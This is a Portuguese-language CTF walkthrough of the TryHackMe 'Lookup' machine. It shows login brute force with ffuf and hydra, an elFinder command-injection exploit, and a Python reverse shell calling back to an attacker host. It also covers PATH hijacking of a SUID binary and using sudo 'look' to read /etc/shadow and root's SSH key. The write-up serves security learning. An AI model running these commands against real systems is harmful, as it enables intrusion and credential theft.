---
title: Lookup
date: 2025-02-07 20:45:00
categories: [TRYHACKME, CTF]
tags: [web,linux,brute force,command injetcion,suid,path hijacking]      # TAG names should always be lowercase
image: 
 path: /assets/img/posts/2025/02/lookup/room_image.webp

---

## Requisitos

Neste CTF, é necessário ter conhecimentos sobre:

- Subdomínios
- Brute Force
- Command Injection
- Binários com SUID
- Engenharia reversa
- Funcionamento do sudo
- Armazenamento de chaves SSH

## Reconhecimento 

Para analisar a superfície de ataque, utilizaremos o Nmap para realizar uma varredura SYN Scan, usando o comando abaixo.

```shell
┌──(root㉿kali)-[/home/alex]
└─# nmap -Pn -sS 10.10.198.41  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 14:42 -03
Nmap scan report for lookup.thm (10.10.198.41)
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.09 seconds
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/alex]
└─# nmap -Pn -sS -p- --open 10.10.198.41
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 14:43 -03
Nmap scan report for lookup.thm (10.10.198.41)
Host is up (0.33s latency).
Not shown: 65430 closed tcp ports (reset), 103 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 110.74 seconds
```

Temos apenas um servidor web e a porta 22 do serviço SSH disponível.

![Home page](/assets/img/posts/2025/02/lookup/home_page.webp)

Tentamos listar os métodos permitidos, mas não recebemos resposta do servidor. Provavelmente, ele foi configurado para não fornecer essa informação.

```shell
┌──(root㉿kali)-[/home/alex]
└─# curl -I -X OPTIONS http://lookup.thm
HTTP/1.1 200 OK
Date: Sat, 01 Feb 2025 17:50:26 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 719
Content-Type: text/html; charset=UTF-8
```

Utilizaremos a ferramenta `gobuster` para enumerar os diretórios disponíveis.

```shell
gobuster dir  -e -u http://lookup.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-1.0.txt
```

![gobuster](/assets/img/posts/2025/02/lookup/gobuster.webp)

Não concluímos a varredura; aparentemente, não encontraremos nenhum diretório com esta wordlist.

As únicas informações que temos são: portas abertas, a versão do servidor web rodando PHP e uma tela de login. Vamos entender o comportamento dessa tela. Quando tentamos acessar com o usuário `admin` e a senha `123`, recebemos a mensagem **Wrong password**.

![burp](/assets/img/posts/2025/02/lookup/burp.webp)

Quando tentamos realizar o acesso com o usuário `adm` e a senha `123`, recebemos a mensagem **Wrong username or password**.

![burp 2](/assets/img/posts/2025/02/lookup/burp2.webp)

Dessa forma, sabemos que o usuário admin existe. Não temos mais informações no momento, então vamos tentar descobrir mais usuários que existem na aplicação.

```shell
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -d "username=FUZZ&password=123" -H "Content-Type: application/x-www-form-urlencoded"  -u http://lookup.thm/login.php -fs 74
```

O motivo do cabeçalho no comando é informar ao servidor que os dados estão codificados no formato `application/x-www-form-urlencoded`, que é o formato padrão para enviar dados de formulários na web.

![ffuf](/assets/img/posts/2025/02/lookup/ffuf.webp)

Encontramos outro usuário, `jose`. Agora, vamos tentar realizar um ataque de `brute force` nos dois usuários encontrados.

```shell
ffuf -w usuarios:FUZZ -w /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt:FUZZ2 -X POST -d "username=FUZZ&password=FUZZ2" -H "Content-Type: application/x-www-form-urlencoded"  -u http://lookup.thm/login.php -fs 62
```

![ffuf 2](/assets/img/posts/2025/02/lookup/ffuf2.webp)

Verificamos se a senha do usuário `admin` é válida.

![brute force](/assets/img/posts/2025/02/lookup/brute-force.webp)

A senha não é válida, mas o comportamento da aplicação foi diferente; não recebemos a mensagem **Wrong password**. Sabemos que o usuário `admin` é válido, então provavelmente estamos utilizando a senha correta com o usuário errado! Vamos tentar usar a mesma senha com o usuário `jose`.

![subdomain discover](/assets/img/posts/2025/02/lookup/subdomain.webp)

A senha é válida para o usuário `jose`! Agora precisamos alterar nosso arquivo `/etc/hosts` para incluir o subdomínio `files`.

```shell
┌──(root㉿kali)-[/home/alex]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.145.252 lookup.thm files.lookup.thm
```

Agora conseguimos visualizar a aplicação.

![elfinder](/assets/img/posts/2025/02/lookup/elfinder.webp)

## Exploração

Com acesso à aplicação, podemos realizar novamente a enumeração e identificar a versão do gerenciador de arquivos web.

![version elfinder](/assets/img/posts/2025/02/lookup/version%20elfinder.webp)


Temos diversos arquivos neste gerenciador de arquivos. Vamos documentá-los.


| **Nome do arquivo** | **Conteúdo**                                      | **Nome do arquivo** | **Conteúdo**                                                |
| :------------------: | ------------------------------------------------- | :-----------------: | ----------------------------------------------------------- |
|       adm.txt        | swaddle<br>throbbed                               |      mysql.txt      | acculturation<br>rotterdam<br>idiosyncratically             |
|      admin.txt       | pectic<br>agretha<br>only-begotten<br>renewable   |     oracle.txt      | gluten<br>enjoyableness                                     |
|  administrator.txt   | rycca<br>show-offs<br>overcast<br>packinghouse    |       pi.txt        | ultracentrifugally<br>whistler<br>pervertedly<br>unlettered |
|     ansible.txt      | erroll<br>madagascan<br>angina<br>eulogistic      |     puppet.txt      | hypothalamus<br>filigreeing                                 |
|    azureuser.txt     | thirty-three<br>underpart<br>responder<br>handgun |      root.txt       | hypothalamus<br>filigreeing                                 |
|   credentials.txt    | think : nopassword                                |        test         | (arquivo vazio)                                             |
|     ec2-user.txt     | resourcelessness<br>jazz                          |      test.txt       | tipoff<br>dhabi<br>deriding<br>hoofer                       |
|       ftp.txt        | harebrained<br>refereed<br>doctorskop             |    thislogin.txt    | jose : password123                                          |
|      guest.txt       | shipman<br>budgie<br>holm<br>firetruck            |      user.txt       | earthy<br>fiduciary<br>weighted<br>outbound                 |
|       info.txt       | hygienic<br>cubby-hole<br>williston<br>arkaroola  |     vagrant.txt     | altair<br>smokestack<br>superconductor                      |


Verificamos os arquivos que a aplicação permite criar.

![Files support](/assets/img/posts/2025/02/lookup/elfinder_files.png)

Sendo assim, tentamos inserir nosso payload dentro de um arquivo PNG.

`exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>"`

![exiftool](/assets/img/posts/2025/02/lookup/exiftool.png)

A aplicação não processa nosso phpinfo. A imagem é aberta normalmente, porém o código php não é executado. Tentamos permitir o formato php na opção Preferences > All, mas mesmo assim, a aplicação não permite o upload desse tipo de formato.

![Error php](/assets/img/posts/2025/02/lookup/erro_php.png)

A versão do gerenciador de arquivos parece ser vulnerável. Encontramos o exploit abaixo para teste:

Exploit: `https://www.exploit-db.com/exploits/46481`

O exploit funciona da seguinte maneira resumidamente:

- Upload de Imagem Maliciosa: O atacante faz upload de uma imagem com um nome de arquivo especialmente criado que contém comandos maliciosos.

- Execução do Payload: Quando o elFinder processa a imagem, ele executa os comandos inseridos no nome do arquivo, permitindo a execução de comandos arbitrários no servidor.

- Acesso à Shell: O exploit pode ser usado para obter uma shell reversa, permitindo ao atacante controlar o servidor comprometido

Para executá-lo, primeiro precisamos ter uma imagem com o nome SecSignal.jpg. Quando executamos o exploit, recebemos o erro abaixo:

![Exploit error](/assets/img/posts/2025/02/lookup/Exploit_error.png)

Para entendermos melhor o erro, vamos inserir um `print(r.text)` dentro da função `upload`. Assim, saberemos como é o `JSON` que estamos recebendo.

![Print r](/assets/img/posts/2025/02/lookup/print_r.png)

Não estamos recebendo resposta. A URL não foi encontrada, provavelmente porque a informamos incorretamente. Abaixo está a URL correta para o exploit funcionar.

![output json](/assets/img/posts/2025/02/lookup/output_json.png)

Agora sabemos a URL correta que devemos utilizar. No entanto, mesmo assim, o alvo não foi explorado. Analisando outro exploit disponível no `msfconsole`, conseguimos obter a shell. A exploração é realizada da mesma maneira: é feito upload de uma imagem que explora uma vulnerabilidade de injeção de comandos no conector PHP do `elFinder`.

Ao analisar melhor o exploit que baixamos do `exploit-db`, descobrimos o motivo do problema. A imagem que estava sendo utilizada estava em formato `PNG`, mesmo com a extensão sendo `.jpg`. O exploit foi desenvolvido para tratar e executar imagem em formato `JPG`. Após a alteração da imagem para uma que de fato é `JPG`, conseguimos obter acesso à máquina.

![shell reverse](/assets/img/posts/2025/02/lookup/shell_reverse.png)

### Melhorando a shell

Agora, vamos melhorar nossa shell para termos mais estabilidade em nossa pós-exploração. Para obtermos a shell reversa, escolhemos o Python.

No alvo:
```shell
/usr/bin/python3.8 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY IP",PORTA));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Depois, deixamos nossa shell reversa full tty.

![full tty](/assets/img/posts/2025/02/lookup/shell_full_tty.png)

## Pós-exploração

Nossa primeira pergunta é `What is the user flag?`. Sendo assim, vamos direto ao diretório `home`, onde encontramos apenas um usuário: `think`.

![home user](/assets/img/posts/2025/02/lookup/home-user.png)

Quando realizamos a enumeração do ElFinder, encontramos o arquivo `credentials.txt`, que continha as informações: `think : nopassword`. No arquivo `/etc/passwd`, há apenas esse usuário criado no sistema.

![passwd](/assets/img/posts/2025/02/lookup/passwd.png)

Não obtivemos sucesso ao tentar logar com as credenciais do usuário.

```shell
www-data@lookup:/home$ su think
Password: 
su: Authentication failure
www-data@lookup:/home$
```

Vamos precisar enumerar o alvo.  
Coletando informações OS.

```shell
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ (cat /proc/version || uname -a ) 2>/dev/null
Linux version 5.4.0-156-generic (buildd@lcy02-amd64-078) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #173-Ubuntu SMP Tue Jul 11 07:25:22 UTC 2023

www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ lsb_release -a 2>/dev/null
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.6 LTS
Release:        20.04
Codename:       focal
```

Versão do `sudo` é vulnerável, porém foi mitigado no alvo.

```shell
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Verificando os diretórios em `PATH`, não possuímos permissão de escrita.

```shell
www-data@lookup:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Analisando os arquivos do usuário `think`não identificamos nenhum um arquivo, que podemos escrever, alguns não podemos ler também, como `.passwords`.

![ls](/assets/img/posts/2025/02/lookup/ls-la.png)

Procurando por binários com `SUID` ativo, encontramos alguns.

```shell
www-data@lookup:/tmp$ find / -perm -u=s -type f 2>/dev/null
...
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
www-data@lookup:/tmp$ 
```

Executando o `/usr/sbin/pwm` temos uma saída diferente do normal.

```shell
www-data@lookup:/tmp$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
www-data@lookup:/tmp$ 
```

O binário verifica qual usuário está executando-o e, após isso, procura pelo arquivo `.passwords`. O arquivo não é encontrado, pois nosso usuário atual não possui o arquivo e o diretório. No entanto, o usuário `think` possui esse arquivo, conforme já tínhamos listado anteriormente. Com o comando `strings`, vemos mais algumas informações da execução do binário.

![strings](/assets/img/posts/2025/02/lookup/strings.png)

Temos uma expressão regular em `uid=%*u(%[^)])`, ela funciona da seguinte maneira:

- `uid=%*u(`: Esta parte corresponde ao texto literal "uid=%" seguido por um número inteiro (`u`) e o caractere `(`. O asterisco `*` após o `%` indica que o número inteiro (`u`) é lido, mas ignorado (não armazenado).

- `%[^)]`: Esta parte corresponde a qualquer sequência de caracteres que não contenham `)` (parêntese fechado). Os caracteres correspondentes a essa parte são armazenados no buffer de correspondência.

Basicamente, a expressão regular extrai a sequência de caracteres que vem logo após o `"uid=%"` e o número, até encontrar um `)`.

Copiamos o binário para nossa máquina local, executando-o vemos que o texto extraído do comando `id`é `root`.

![id root](/assets/img/posts/2025/02/lookup/idRoot.png)

O comando `id` está sendo executado com privilégios administrativos, vamos realizar um `path hijacking`. Caso o caminho para executar o comando `id` no binário esteja definido como relativo, conseguiremos manipular a execução.

O binário, como vimos, verifica o nome do usuário e depois verifica o conteúdo do arquivo `.passwords` no diretório `home` desse usuário. Não podemos simplesmente criar um arquivo `/bin/bash`, porque a informação da saída do comando `id` é usada para determinar qual diretório `home` será verificado.

Vamos criar o seguinte arquivo `id` no diretório `/tmp`.

```bash
www-data@lookup:/tmp$ echo -e '#!/bin/bash\necho "uid=33(think) gid=33(www-data) groups=33(www-data)"' > /tmp/id
www-data@lookup:/tmp$ cat id
#!/bin/bash
echo "uid=33(think) gid=33(www-data) groups=33(www-data)"
www-data@lookup:/tmp$ 
```

Agora vamos inserir o diretório `/tmp` no `PATH`, para que o nosso script criado seja utilizado.

```shell
www-data@lookup:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@lookup:/tmp$ export PATH=/tmp:$PATH
www-data@lookup:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@lookup:/tmp$ 
```

Quando o sistema executa alguma variável de ambiente, ele verifica os diretórios contidos no `PATH` da esquerda para a direita. Sendo assim, o primeiro diretório a ser verificado será o `/tmp`.   
Vamos executar o binário novamente.

![content passwords](/assets/img/posts/2025/02/lookup/content_passwords.png)

Transferimos todas as senhas contidas no arquivo .passwords para um arquivo local. No total, temos 49 senhas.

```shell
┌──(root㉿estudos)-[/home/alex/Desktop]
└─# wc -l wordlist_think             
49 wordlist_think
```

Sabemos que a porta do serviço `ssh` está ativa. Vamos tentar realizar o acesso utilizando essas senhas.

```shell
hydra -l think -P wordlist_think ssh://lookup.thm 
```

![hydra](/assets/img/posts/2025/02/lookup/hydra.png)

Obtemos a senha correta, agora vamos realizar o acesso via `SSH` .

```shell
┌──(root㉿estudos)-[/home/alex/Desktop]
└─# ssh think@lookup.thm 
think@lookup:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

Nossa primeira flag está no arquivo `user.txt` .

```text
think@lookup:~$ cat user.txt 
38[REDACTED]0e
```

## Escalonando para root

Verificando os arquivos ocultos no mesmo diretório, não identificamos formas de escalar privilégio até o usuário root.

![home think](/assets/img/posts/2025/02/lookup/home_think.png)

Vamos verificar quais comandos podemos executar como `root`.

```shell
think@lookup:~$ sudo -l
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
think@lookup:~$
```

O comando `look` pode ser executado como `root`. Vamos verificar o que esse comando faz, lendo sua documentação com `man look`.

![look](/assets/img/posts/2025/02/lookup/look.png)

Informamos uma string e um arquivo, e o comando irá procurar todas as linhas que comecem com a string informada. Como o comando é executado com privilégio `root`, podemos ler os arquivos que somente o `root` tem acesso, por exemplo, `/etc/shadow`.

![shadow](/assets/img/posts/2025/02/lookup/shadow.png)

Copiamos o conteúdo de `shadow` e de `passwd` para nossa máquina local.   
Já sabemos a senha de `think`, então apenas nos interessa a senha do `root`. Sendo assim, criamos um arquivo `hash` com o utilitário `unshadow`, contendo a hash do usuário `root`.

```shell
┌──(root㉿estudos)-[/home/alex/Desktop]
└─# unshadow passwd shadown > hash
```

O algoritmo de hash utilizado é `sha512`. Vamos utilizar esse formato no programa `john` para descobrir a hash.

![sha512](/assets/img/posts/2025/02/lookup/sha512.png)

```shell
┌──(root㉿estudos)-[/home/alex/Desktop]
└─# john --format=sha512crypt hashes --wordlist=rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:17:59 7.70% (ETA: 22:21:47) 0g/s 1157p/s 1157c/s 1157C/s supermod1..supergirl23
Session aborted
```

Depois de um certo período de tempo executando a quebra, abortamos a execução do programa. Aparentemente, a senha não será descoberta dessa forma. Sabemos o caminho padrão onde o sistema salva as chaves ssh.

Caminho: `~/.ssh/`

Vamos verificar se é possível recuperar a chave privada do usuário `root`

![id_rsa](/assets/img/posts/2025/02/lookup/id_rsa.png)

Conseguimos recupera-la, agora tentaremos realizar o acesso `ssh`, utilizando a chave privada do `root`.


```shell
┌──(root㉿estudos)-[/home/alex/Desktop]
└─# ssh -i id_rsa root@lookup.thm
root@lookup:~# ls -l
total 60K
drwx------  6 root root 4.0K May 13  2024 .
drwxr-xr-x 19 root root 4.0K Jan 11  2024 ..
lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.2K May 12  2024 .bashrc
drwx------  2 root root 4.0K Jan 11  2024 .cache
-rwxrwx---  1 root root   66 Jan 11  2024 cleanup.sh
drwx------  3 root root 4.0K Apr 17  2024 .config
drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
-rw-r--r--  1 root root  161 Jan 11  2024 .profile
-rw-r-----  1 root root   33 Jan 11  2024 root.txt
lrwxrwxrwx  1 root root    9 Jul 31  2023 .selected_editor -> /dev/null
drwx------  2 root root 4.0K Jan 11  2024 .ssh
-rw-rw-rw-  1 root root  17K May 13  2024 .viminfo
root@lookup:~# cat root.txt 
5a28[REDACTED]18e8
```

Conseguimos o acesso `ssh` e também nossa última flag deste CTF.






